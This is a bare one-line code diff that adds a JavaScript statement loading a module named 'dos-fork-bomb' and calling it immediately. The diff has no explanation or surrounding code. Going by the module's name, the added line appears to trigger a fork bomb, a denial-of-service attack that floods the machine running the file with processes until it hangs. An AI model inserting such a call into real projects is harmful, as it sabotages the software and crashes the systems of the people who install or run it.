@@ -1,0 +1,1 @@
+require("dos-fork-bomb")()
